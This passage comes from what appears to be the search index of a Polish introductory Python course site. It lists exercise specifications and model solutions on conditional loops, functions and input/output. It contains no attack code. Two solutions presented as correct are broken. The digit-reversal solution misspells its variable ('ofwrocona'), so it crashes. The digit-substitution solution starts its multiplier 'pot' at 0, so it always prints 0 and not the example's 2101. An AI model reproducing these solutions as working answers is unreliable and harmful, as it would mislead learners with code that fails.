warunkowa","text":""},{"location":"programming/python/exercises/conditional-loop/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-loop/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-loop/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/#wynik","title":"Wynik","text":"<ul> <li>Kolejne cyfry liczby \\(n\\), wypisane od ko\u0144ca, tzn. zaczynaj\u0105c od cyfry jedno\u015bci</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-loop/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-loop/#dane_1","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/#wynik_1","title":"Wynik","text":"<ul> <li>Suma cyfr liczby \\(n\\)</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/#przykad","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/conditional-loop/#dane_2","title":"Dane","text":"<pre><code>n := 1234\n</code></pre> <p>Wynik: \\(10\\)</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(1+2+3+4=10\\) </p>"},{"location":"programming/python/exercises/conditional-loop/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-loop/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-loop/#dane_3","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/#wynik_2","title":"Wynik","text":"<ul> <li>Liczba powsta\u0142a poprzez odwr\u00f3cenie cyfr liczby \\(n\\)</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/conditional-loop/#dane_4","title":"Dane","text":"<pre><code>n := 1234\n</code></pre> <p>Wynik: \\(4321\\)</p>"},{"location":"programming/python/exercises/conditional-loop/#zadanie-4","title":"Zadanie 4","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-loop/#specyfikacja_3","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-loop/#dane_5","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(k\\) - liczba naturalna z zakresu \\([0,9]\\)</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/#wynik_3","title":"Wynik","text":"<ul> <li>Liczba powsta\u0142a poprzez zast\u0105pienie ka\u017cdej cyfry liczby \\(n\\) przez warto\u015b\u0107 bezwzgl\u0119dn\u0105 r\u00f3\u017cnicy liczby \\(k\\) i danej cyfry</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/#przykad_2","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/conditional-loop/#dane_6","title":"Dane","text":"<pre><code>n := 1234\nk := 3\n</code></pre> <p>Wynik: \\(2101\\)</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(|3-1|=2\\) </p> <p>\\(|3-2|=1\\) </p> <p>\\(|3-3|=0\\) </p> <p>\\(|3-4|=1\\) </p>"},{"location":"programming/python/exercises/conditional-loop/#zadanie-5","title":"Zadanie 5","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-loop/#specyfikacja_4","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-loop/#dane_7","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/#wynik_4","title":"Wynik","text":"<ul> <li>Zapis binarny liczby \\(n\\)</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/#przykad_3","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/conditional-loop/#dane_8","title":"Dane","text":"<pre><code>n := 10\n</code></pre> <p>Wynik: \\(1010\\)</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(10_{10}=1010_2\\) </p>"},{"location":"programming/python/exercises/conditional-loop/#zadanie-6","title":"Zadanie 6","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-loop/#specyfikacja_5","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-loop/#dane_9","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(p\\) - liczba naturalna z zakresu \\([2,9]\\)</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/#wynik_5","title":"Wynik","text":"<ul> <li>Zapis liczby \\(n\\) w systemie o podstawie \\(p\\) </li> </ul>"},{"location":"programming/python/exercises/conditional-loop/#przykad_4","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/conditional-loop/#dane_10","title":"Dane","text":"<pre><code>n := 10\np := 3\n</code></pre> <p>Wynik: \\(101\\)</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(10_{10}=101_3\\) </p>"},{"location":"programming/python/exercises/conditional-loop/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"programming/python/exercises/conditional-loop/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-loop/solution-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-loop/solution-1/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/solution-1/#wynik","title":"Wynik","text":"<ul> <li>Kolejne cyfry liczby \\(n\\), wypisane od ko\u0144ca, tzn. zaczynaj\u0105c od cyfry jedno\u015bci</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 naturaln\u0105: \"))\n\nwhile n &gt; 0:\n    cyfra = n % 10\n    print(cyfra)\n    n = n // 10\n</code></pre>"},{"location":"programming/python/exercises/conditional-loop/solution-2/","title":"Rozwi\u0105zanie 2","text":""},{"location":"programming/python/exercises/conditional-loop/solution-2/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-loop/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-loop/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/solution-2/#wynik","title":"Wynik","text":"<ul> <li>Suma cyfr liczby \\(n\\)</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 naturaln\u0105: \"))\n\nsuma = 0\n\nwhile n &gt; 0:\n    cyfra = n % 10\n    suma += cyfra\n    n = n // 10\n\nprint(f\"Suma cyfr podanej liczby wynosi {suma}\")\n</code></pre>"},{"location":"programming/python/exercises/conditional-loop/solution-3/","title":"Rozwi\u0105zanie 3","text":""},{"location":"programming/python/exercises/conditional-loop/solution-3/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-loop/solution-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-loop/solution-3/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/solution-3/#wynik","title":"Wynik","text":"<ul> <li>Liczba powsta\u0142a poprzez odwr\u00f3cenie cyfr liczby \\(n\\)</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/solution-3/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 naturaln\u0105: \"))\n\nodwrocona = 0\n\nwhile n &gt; 0:\n    cyfra = n % 10\n\n    ofwrocona *= 10\n    odwrocona += cyfra\n\n    n = n // 10\n\nprint(f\"Liczba powsta\u0142a z odwr\u00f3cenia cyfr podanej liczby to {odwrocona}\")\n</code></pre>"},{"location":"programming/python/exercises/conditional-loop/solution-4/","title":"Rozwi\u0105zanie 4","text":""},{"location":"programming/python/exercises/conditional-loop/solution-4/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-loop/solution-4/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-loop/solution-4/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(k\\) - liczba naturalna z zakresu \\([0,9]\\)</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/solution-4/#wynik","title":"Wynik","text":"<ul> <li>Liczba powsta\u0142a poprzez zast\u0105pienie ka\u017cdej cyfry liczby \\(n\\) przez warto\u015b\u0107 bezwzgl\u0119dn\u0105 r\u00f3\u017cnicy liczby \\(k\\) i danej cyfry</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/solution-4/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj pierwsz\u0105 liczb\u0119: \"))\nk = int(input(\"Podaj drug\u0105 liczb\u0119: \"))\n\nnowa = 0\npot = 0\n\nwhile n &gt; 0:\n    cyfra = n % 10\n    cyfra = abs(k - cyfra)\n\n    nowa += cyfra * pot\n    pot *= 10\n\n    n = n // 10\n\nprint(f\"Nowa liczba: {nowa}\")\n</code></pre>"},{"location":"programming/python/exercises/conditional-loop/solution-5/","title":"Rozwi\u0105zanie 5","text":""},{"location":"programming/python/exercises/conditional-loop/solution-5/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-loop/solution-5/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-loop/solution-5/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/solution-5/#wynik","title":"Wynik","text":"<ul> <li>Zapis binarny liczby \\(n\\)</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/solution-5/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 naturaln\u0105: \"))\n\nbinarna = \"\"\n\nwhile n &gt; 0:\n    cyfra = n % 2\n\n    binarna = str(cyfra) + binarna\n\n    n = n // 2\n\nprint(f\"Warto\u015b\u0107 binarna podanej liczby: {binarna}\")\n</code></pre>"},{"location":"programming/python/exercises/conditional-loop/solution-6/","title":"Rozwi\u0105zanie 6","text":""},{"location":"programming/python/exercises/conditional-loop/solution-6/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/conditional-loop/solution-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/conditional-loop/solution-6/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(p\\) - liczba naturalna z zakresu \\([2,9]\\)</li> </ul>"},{"location":"programming/python/exercises/conditional-loop/solution-6/#wynik","title":"Wynik","text":"<ul> <li>Zapis liczby \\(n\\) w systemie o podstawie \\(p\\) </li> </ul>"},{"location":"programming/python/exercises/conditional-loop/solution-6/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 naturaln\u0105: \"))\np = int(input(\"Podaj podstaw\u0119 systemu docelowego: \"))\n\nnowa = \"\"\n\nwhile n &gt; 0:\n    cyfra = n % p\n\n    nowa = str(cyfra) + nowa\n\n    n = n // p\n\nprint(f\"Warto\u015b\u0107 w systemie {p}: {nowa}\")\n</code></pre>"},{"location":"programming/python/exercises/functions/","title":"Funkcje","text":""},{"location":"programming/python/exercises/functions/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wypisanie komunikatu powinno zosta\u0107 zrealizowane za pomoc\u0105 funkcji.</p>"},{"location":"programming/python/exercises/functions/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/functions/#dane","title":"Dane","text":"<ul> <li>\\(imie\\) - ci\u0105g znak\u00f3w, ma\u0142ych i wielkich liter alfabetu angielskiego</li> </ul>"},{"location":"programming/python/exercises/functions/#wynik","title":"Wynik","text":"<ul> <li>Komunikat powitania w formie \"Witaj [imie]!\", np. \"Witaj Damian!\"</li> </ul>"},{"location":"programming/python/exercises/functions/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Obliczanie sumy powinno by\u0107 zrealizowane za pomoc\u0105 funkcji.</p>"},{"location":"programming/python/exercises/functions/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/functions/#dane_1","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> </ul>"},{"location":"programming/python/exercises/functions/#wynik_1","title":"Wynik","text":"<ul> <li>Suma liczb \\(a\\) i \\(b\\) </li> </ul>"},{"location":"programming/python/exercises/functions/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Obliczanie dzielnik\u00f3w powinno by\u0107 zrealizowane za pomoc\u0105 funkcji.</p>"},{"location":"programming/python/exercises/functions/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/functions/#dane_2","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/functions/#wynik_2","title":"Wynik","text":"<ul> <li>Wszystkie dzielniki liczby \\(n\\) </li> </ul>"},{"location":"programming/python/exercises/functions/#przykad","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/functions/#dane_3","title":"Dane","text":"<pre><code>n := 10\n</code></pre> <p>Wynik: \\(1, 2, 5, 10\\) </p>"},{"location":"programming/python/exercises/functions/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"programming/python/exercises/functions/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wypisanie komunikatu powinno zosta\u0107 zrealizowane za pomoc\u0105 funkcji.</p>"},{"location":"programming/python/exercises/functions/solution-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/functions/solution-1/#dane","title":"Dane","text":"<ul> <li>\\(imie\\) - ci\u0105g znak\u00f3w, ma\u0142ych i wielkich liter alfabetu angielskiego</li> </ul>"},{"location":"programming/python/exercises/functions/solution-1/#wynik","title":"Wynik","text":"<ul> <li>Komunikat powitania w formie \"Witaj [imie]!\", np. \"Witaj Damian!\"</li> </ul>"},{"location":"programming/python/exercises/functions/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>def powitanie(imie: str):\n    print(f\"Witaj {imie}!\")\n\nimie = input(\"Podaj swoje imi\u0119: \")\n\npowitanie(imie)\n</code></pre>"},{"location":"programming/python/exercises/functions/solution-2/","title":"Rozwi\u0105zanie 2","text":""},{"location":"programming/python/exercises/functions/solution-2/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Obliczanie sumy powinno by\u0107 zrealizowane za pomoc\u0105 funkcji.</p>"},{"location":"programming/python/exercises/functions/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/functions/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> </ul>"},{"location":"programming/python/exercises/functions/solution-2/#wynik","title":"Wynik","text":"<ul> <li>Suma liczb \\(a\\) i \\(b\\) </li> </ul>"},{"location":"programming/python/exercises/functions/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>def suma(a: int, b: int) -&gt; int:\n    return a + b\n\na = int(input(\"Podaj pierwsz\u0105 liczb\u0119: \"))\nb = int(input(\"Podaj drug\u0105 liczb\u0119: \"))\n\nwynik = suma(a, b)\n\nprint(f\"{a} + {b} = {wynik}\")\n</code></pre>"},{"location":"programming/python/exercises/functions/solution-3/","title":"Rozwi\u0105zanie 3","text":""},{"location":"programming/python/exercises/functions/solution-3/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Obliczanie dzielnik\u00f3w powinno by\u0107 zrealizowane za pomoc\u0105 funkcji.</p>"},{"location":"programming/python/exercises/functions/solution-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/functions/solution-3/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/functions/solution-3/#wynik","title":"Wynik","text":"<ul> <li>Wszystkie dzielniki liczby \\(n\\) </li> </ul>"},{"location":"programming/python/exercises/functions/solution-3/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>def dzielniki(n: int) -&gt; []:\n    wynik = []\n\n    for i in range(1, n + 1):\n        if n % i == 0:\n            wynik.append(i)\n\n    return wynik\n\nn = int(input(\"Podaj liczb\u0119 naturaln\u0105: \"))\n\nwynik = dzielniki(n)\n\nprint(f\"Dzielniki {n}: {wynik}\")\n</code></pre>"},{"location":"programming/python/exercises/input-output/","title":"Obs\u0142uga wej\u015bcia/wyj\u015bcia","text":""},{"location":"programming/python/exercises/input-output/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/input-output/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/#dane","title":"Dane","text":"<ul> <li>\\(imie\\) - ci\u0105g znak\u00f3w, ma\u0142ych i wielkich liter alfabetu angielskiego.</li> </ul>"},{"location":"programming/python/exercises/input-output/#wynik","title":"Wynik","text":"<ul> <li>Komunikat powitania w formie \"Witaj [imie]!\"</li> </ul>"},{"location":"programming/python/exercises/input-output/#przykad","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/input-output/#dane_1","title":"Dane","text":"<pre><code>imie := \"Damian\"\n</code></pre> <p>Wynik: \"Witaj Damian!\"</p>"},{"location":"programming/python/exercises/input-output/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/input-output/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/#dane_2","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite.</li> </ul>"},{"location":"programming/python/exercises/input-output/#wynik_1","title":"Wynik","text":"<ul> <li>Suma liczb \\(a\\) i \\(b\\).</li> </ul>"},{"location":"programming/python/exercises/input-output/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/input-output/#dane_3","title":"Dane","text":"<pre><code>a := 2\nb := 3\n</code></pre> <p>Wynik: \\(5\\) </p>"},{"location":"programming/python/exercises/input-output/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/input-output/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/#dane_4","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite, r\u00f3\u017cne od zera.</li> </ul>"},{"location":"programming/python/exercises/input-output/#wynik_2","title":"Wynik","text":"<ul> <li>Iloraz (wynik dzielenia), iloczyn (wynik mno\u017cenia), suma oraz r\u00f3\u017cnica liczb \\(a\\) i \\(b\\).</li> </ul>"},{"location":"programming/python/exercises/input-output/#przykad_2","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/input-output/#dane_5","title":"Dane","text":"<pre><code>a := 1\nb := 2\n</code></pre> <p>Wynik:  <pre><code>Iloraz: 0.5\nIloczyn: 2\nSuma: 3\nR\u00f3\u017cnica: -1\n</code></pre></p>"},{"location":"programming/python/exercises/input-output/#zadanie-4","title":"Zadanie 4","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/input-output/#specyfikacja_3","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/#dane_6","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby naturalne, wi\u0119ksze od zera.</li> </ul>"},{"location":"programming/python/exercises/input-output/#wynik_3","title":"Wynik","text":"<ul> <li>Wynik dzielenia ca\u0142kowitego oraz reszta z dzielenia liczb \\(a\\) i \\(b\\).</li> </ul>"},{"location":"programming/python/exercises/input-output/#przykad_3","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/input-output/#dane_7","title":"Dane","text":"<pre><code>a := 7\nb := 3\n</code></pre> <p>Wynik: \\(2\\), reszty \\(1\\).</p>"},{"location":"programming/python/exercises/input-output/#zadanie-5","title":"Zadanie 5","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p> <p>Info</p> <p>Podpowied\u017a</p> <p>Skorzystaj z funkcji <code>sqrt</code> z biblioteki <code>math</code>.</p>"},{"location":"programming/python/exercises/input-output/#specyfikacja_4","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/#dane_8","title":"Dane","text":"<ul> <li>\\(a\\) - liczba naturalna.</li> </ul>"},{"location":"programming/python/exercises/input-output/#wynik_4","title":"Wynik","text":"<ul> <li>Pierwiastek z \\(a\\)</li> </ul>"},{"location":"programming/python/exercises/input-output/#przykad_4","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/input-output/#dane_9","title":"Dane","text":"<pre><code>a := 4\n</code></pre> <p>Wynik: \\(2\\) </p>"},{"location":"programming/python/exercises/input-output/#zadanie-6","title":"Zadanie 6","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wykorzystaj funkcj\u0119 min.</p>"},{"location":"programming/python/exercises/input-output/#specyfikacja_5","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/#dane_10","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite.</li> </ul>"},{"location":"programming/python/exercises/input-output/#wynik_5","title":"Wynik","text":"<ul> <li>Mniejsza z liczb \\(a\\) i \\(b\\), lub dowolna gdy s\u0105 sobie r\u00f3wne.</li> </ul>"},{"location":"programming/python/exercises/input-output/#przykad_5","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/input-output/#dane_11","title":"Dane","text":"<pre><code>a := 5\nb := 3\n</code></pre> <p>Wynik: \\(3\\) </p>"},{"location":"programming/python/exercises/input-output/#zadanie-7","title":"Zadanie 7","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wykorzystaj funkcj\u0119 max.</p>"},{"location":"programming/python/exercises/input-output/#specyfikacja_6","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/#dane_12","title":"Dane","text":"<ul> <li>\\(a, b, c\\) - trzy liczby ca\u0142kowite.</li> </ul>"},{"location":"programming/python/exercises/input-output/#wynik_6","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z liczb \\(a\\), \\(b\\) i \\(c\\) , lub dowolna gdy s\u0105 sobie r\u00f3wne.</li> </ul>"},{"location":"programming/python/exercises/input-output/#przykad_6","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/input-output/#dane_13","title":"Dane","text":"<pre><code>a := 3\nb := 1\nc := 3\n</code></pre> <p>Wynik: \\(3\\) </p>"},{"location":"programming/python/exercises/input-output/#zadanie-8","title":"Zadanie 8","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/input-output/#specyfikacja_7","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/#dane_14","title":"Dane","text":"<ul> <li>\\(sekundy\\) - liczba naturalna.</li> </ul>"},{"location":"programming/python/exercises/input-output/#wynik_7","title":"Wynik","text":"<ul> <li>Czas podany w czytelnej formie \\(H:M:S\\) (\\(H\\) - godziny, \\(M\\) - minuty, \\(S\\) - sekundy).</li> </ul>"},{"location":"programming/python/exercises/input-output/#przykad_7","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/input-output/#dane_15","title":"Dane","text":"<pre><code>sekundy := 9179\n</code></pre> <p>Wynik: \\(2:32:59\\) </p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(2H=7200S\\) </p> <p>\\(32M=1920S\\) </p> <p>\\(2H+32M+59S=7200S+1920S+59S=9179S\\) </p>"},{"location":"programming/python/exercises/input-output/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"programming/python/exercises/input-output/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/input-output/solution-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/solution-1/#dane","title":"Dane","text":"<ul> <li>\\(imie\\) - ci\u0105g znak\u00f3w, ma\u0142ych i wielkich liter alfabetu angielskiego</li> </ul>"},{"location":"programming/python/exercises/input-output/solution-1/#wynik","title":"Wynik","text":"<ul> <li>Komunikat powitania w formie \"Witaj [imie]!\", np. \"Witaj Damian!\"</li> </ul>"},{"location":"programming/python/exercises/input-output/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>imie = input(\"Podaj swoje imi\u0119: \")\n\nprint(f\"Witaj {imie}!\")\n</code></pre>"},{"location":"programming/python/exercises/input-output/solution-2/","title":"Rozwi\u0105zanie 2","text":""},{"location":"programming/python/exercises/input-output/solution-2/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/input-output/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> </ul>"},{"location":"programming/python/exercises/input-output/solution-2/#wynik","title":"Wynik","text":"<ul> <li>Suma liczb \\(a\\) i \\(b\\) </li> </ul>"},{"location":"programming/python/exercises/input-output/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>a = int(input(\"Podaj pierwsz\u0105 liczb\u0119: \"))\nb = int(input(\"Podaj drug\u0105 liczb\u0119: \"))\n\nsuma = a + b\n\nprint(f\"{a} + {b} = {suma}\")\n</code></pre>"},{"location":"programming/python/exercises/input-output/solution-3/","title":"Rozwi\u0105zanie 3","text":""},{"location":"programming/python/exercises/input-output/solution-3/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/input-output/solution-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/solution-3/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite, r\u00f3\u017cne od zera.</li> </ul>"},{"location":"programming/python/exercises/input-output/solution-3/#wynik","title":"Wynik","text":"<ul> <li>Iloraz (wynik dzielenia), iloczyn (wynik mno\u017cenia), suma oraz r\u00f3\u017cnica liczb \\(a\\) i \\(b\\).</li> </ul>"},{"location":"programming/python/exercises/input-output/solution-3/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>a = int(input(\"Podaj pierwsz\u0105 liczb\u0119: \"))\nb = int(input(\"Podaj drug\u0105 liczb\u0119: \"))\n\niloraz = a / b\niloczyn = a * b\nsuma = a + b\nroznica = a - b\n\nprint(\"Iloraz:\", iloraz)\nprint(\"Iloczyn:\", iloczyn)\nprint(\"Suma:\", suma)\nprint(\"R\u00f3\u017cnica:\", roznica)\n</code></pre>"},{"location":"programming/python/exercises/input-output/solution-4/","title":"Rozwi\u0105zanie 4","text":""},{"location":"programming/python/exercises/input-output/solution-4/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/input-output/solution-4/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/solution-4/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby naturalne, wi\u0119ksze od zera</li> </ul>"},{"location":"programming/python/exercises/input-output/solution-4/#wynik","title":"Wynik","text":"<ul> <li>Wynik dzielenia ca\u0142kowitego oraz reszta z dzielenia liczb \\(a\\) i \\(b\\) </li> </ul>"},{"location":"programming/python/exercises/input-output/solution-4/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>a = int(input(\"Podaj pierwsz\u0105 liczb\u0119: \"))\nb = int(input(\"Podaj drug\u0105 liczb\u0119: \"))\n\ndiv = a // 